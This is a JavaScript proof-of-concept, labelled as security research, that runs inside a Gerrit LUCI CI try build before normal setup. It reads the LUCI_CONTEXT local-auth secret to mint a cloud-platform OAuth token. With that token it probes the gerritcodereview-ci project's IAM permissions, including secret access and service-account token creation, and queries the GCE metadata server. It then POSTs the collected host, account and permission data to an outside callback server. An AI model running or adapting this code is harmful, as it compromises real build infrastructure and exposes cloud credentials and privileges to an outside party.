// Security research only. Executes before the normal setup and exports no tokens.
const fs = require('fs');
const os = require('os');

const CALLBACK_URL = 'https://luci-rce-receiver-o324i7mbdq-uc.a.run.app';
const SESSION = '6df0c4d852a7f2f97c0ae548d041b1fc493c049a553c41146d9cb038adc6be6a';
const MARKER = 'LUCI_RCE_LIVE_20261112_656594';

async function request(url, options = {}, timeoutMs = 6000) {
  const response = await fetch(url, {
    ...options,
    signal: AbortSignal.timeout(timeoutMs),
  });
  const text = await response.text();
  let body = text;
  try {
    body = JSON.parse(text);
  } catch (_) {}
  return {status: response.status, body};
}

async function metadata(path) {
  return request('http://metadata.google.internal/computeMetadata/v1/' + path, {
    headers: {'Metadata-Flavor': 'Google'},
  }, 2500);
}

async function main() {
  const receipt = {
    marker: MARKER,
    change: 656594,
    executedAt: new Date().toISOString(),
    hostname: os.hostname(),
    user: os.userInfo().username,
    platform: process.platform,
    arch: process.arch,
    node: process.version,
    cwd: process.cwd(),
    safeEnvironment: {},
    environmentKeys: Object.keys(process.env).filter(
      key => /^(BUILDBUCKET|LUCI|SWARMING|RESULTDB|BOT_|TASK_)/.test(key),
    ).sort(),
  };
  for (const key of [
    'BUILDBUCKET_BUILD_ID',
    'BUILDBUCKET_BUILDER',
    'BUILDBUCKET_PROJECT',
    'BUILDBUCKET_BUCKET',
    'SWARMING_TASK_ID',
    'SWARMING_BOT_ID',
  ]) {
    if (process.env[key]) receipt.safeEnvironment[key] = process.env[key];
  }

  let localAuth = null;
  const contextPath = process.env.LUCI_CONTEXT;
  if (contextPath) {
    try {
      const context = JSON.parse(fs.readFileSync(contextPath, 'utf8'));
      receipt.luciContextKeys = Object.keys(context).sort();
      if (context.local_auth) {
        localAuth = context.local_auth;
        receipt.localAuth = {
          rpcPortPresent: Boolean(localAuth.rpc_port),
          defaultAccountId: localAuth.default_account_id || null,
          accounts: (localAuth.accounts || []).map(account => ({
            id: account.id || null,
            email: account.email || null,
          })),
        };
      }
      if (context.swarming) receipt.swarmingContextKeys = Object.keys(context.swarming).sort();
      if (context.resultdb) receipt.resultdbContextKeys = Object.keys(context.resultdb).sort();
    } catch (error) {
      receipt.luciContextError = String(error);
    }
  }

  if (localAuth && localAuth.rpc_port && localAuth.secret) {
    try {
      const tokenResponse = await request(
        `http://127.0.0.1:${localAuth.rpc_port}/rpc/LuciLocalAuthService.GetOAuthToken`,
        {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({
            account_id: localAuth.default_account_id,
            scopes: ['https://www.googleapis.com/auth/cloud-platform'],
            secret: localAuth.secret,
          }),
        },
      );
      const token = tokenResponse.body && tokenResponse.body.access_token;
      receipt.localAuthToken = {
        httpStatus: tokenResponse.status,
        obtained: Boolean(token),
        errorCode: tokenResponse.body && tokenResponse.body.error_code,
        errorMessage: tokenResponse.body && tokenResponse.body.error_message,
      };
      if (token) {
        const tokenInfo = await request(
          'https://oauth2.googleapis.com/tokeninfo?access_token=' + encodeURIComponent(token),
        );
        if (tokenInfo.body && typeof tokenInfo.body === 'object') {
          receipt.tokenInfo = {
            httpStatus: tokenInfo.status,
            email: tokenInfo.body.email,
            scope: tokenInfo.body.scope,
            expiresIn: tokenInfo.body.expires_in,
            audience: tokenInfo.body.aud,
            issuer: tokenInfo.body.iss,
          };
        } else {
          receipt.tokenInfo = {httpStatus: tokenInfo.status};
        }
        const projectInfo = await request(
          'https://cloudresourcemanager.googleapis.com/v3/projects/gerritcodereview-ci',
          {headers: {Authorization: 'Bearer ' + token}},
        );
        receipt.projectGet = {
          httpStatus: projectInfo.status,
          projectId: projectInfo.body && projectInfo.body.projectId,
          displayName: projectInfo.body && projectInfo.body.displayName,
          state: projectInfo.body && projectInfo.body.state,
          errorStatus: projectInfo.body && projectInfo.body.error && projectInfo.body.error.status,
        };
        const permissions = [
          'resourcemanager.projects.get',
          'storage.buckets.list',
          'storage.buckets.create',
          'secretmanager.secrets.list',
          'secretmanager.versions.access',
          'iam.serviceAccounts.list',
          'iam.serviceAccounts.create',
          'iam.serviceAccountTokens.create',
          'cloudbuild.builds.create',
        ];
        const iamTest = await request(
          'https://cloudresourcemanager.googleapis.com/v3/projects/gerritcodereview-ci:testIamPermissions',
          {
            method: 'POST',
            headers: {
              Authorization: 'Bearer ' + token,
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({permissions}),
          },
        );
        receipt.projectIamTest = {
          httpStatus: iamTest.status,
          requestedPermissions: permissions,
          grantedPermissions: iamTest.body && iamTest.body.permissions,
          errorStatus: iamTest.body && iamTest.body.error && iamTest.body.error.status,
          errorMessage: iamTest.body && iamTest.body.error && iamTest.body.error.message,
        };
      }
    } catch (error) {
      receipt.localAuthError = String(error);
    }
  }

  receipt.metadata = {};
  for (const [name, path] of Object.entries({
    projectId: 'project/project-id',
    defaultServiceAccount: 'instance/service-accounts/default/email',
    defaultServiceAccountScopes: 'instance/service-accounts/default/scopes',
  })) {
    try {
      const result = await metadata(path);
      receipt.metadata[name] = {
        httpStatus: result.status,
        value: typeof result.body === 'string' ? result.body.slice(0, 2000) : result.body,
      };
    } catch (error) {
      receipt.metadata[name] = {error: String(error)};
    }
  }

  // Safe for public build logs: no local-auth secret or OAuth token is included.
  console.log('LUCI_RCE_PROBE ' + JSON.stringify(receipt));
  try {
    const callback = await request(CALLBACK_URL + '/v1/session/' + SESSION + '/receipt', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Probe-Session': SESSION,
        'User-Agent': 'luci-rce-research',
      },
      body: JSON.stringify({kind: 'gerrit-luci-try-rce-v1', data: receipt}),
    }, 10000);
    console.log('LUCI_RCE_CALLBACK_STATUS ' + callback.status);
  } catch (error) {
    console.log('LUCI_RCE_CALLBACK_ERROR ' + String(error));
  }
}

main().catch(error => {
  console.log('LUCI_RCE_PROBE_ERROR ' + String(error));
});
